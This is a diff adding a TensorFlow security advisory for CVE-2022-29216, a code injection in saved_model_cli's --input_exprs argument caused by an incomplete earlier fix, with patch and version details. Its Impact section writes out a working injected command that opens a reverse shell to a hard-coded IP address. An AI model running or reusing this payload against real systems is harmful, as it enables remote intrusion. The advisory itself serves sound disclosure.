@@ -1,0 +1,33 @@
+<h2>TFSA-2022-060: Code injection in <code>saved_model_cli</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-29216</p>
+<h3>Impact</h3>
+<p>TensorFlow's <code>saved_model_cli</code> tool is vulnerable to a code injection:</p>
+<p><code>saved_model_cli run --input_exprs 'x=print("malicious code to run")' --dir ./
+--tag_set serve --signature_def serving_default</code></p>
+<p>This can be used to open a reverse shell</p>
+<p><code>saved_model_cli run --input_exprs 'hello=exec("""\nimport socket\nimport
+subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.0.2.143",33419))\nsubprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")'
+--dir ./ --tag_set serve --signature_def serving_default</code></p>
+<p>This is because <a href="https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7">the fix</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41228">CVE-2021-41228</a> was incomplete. Under <a href="https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574">certain code paths</a> it still allows unsafe execution:</p>
+<p>```python
+def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
+  # ...</p>
+<p>for input_raw in filter(bool, input_exprs_str.split(';')):
+    # ...
+    if safe:
+      # ...
+    else:
+      # ast.literal_eval does not work with numpy expressions
+      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
+  return input_dict
+```</p>
+<p>This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.</p>
+<p>However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the <code>safe=False</code> argument, so all parsing is done withough calling <code>eval</code>.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac">c5da7af048611aa29e9382371f0aed5018516cac</a>.</p>
+<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.</p>
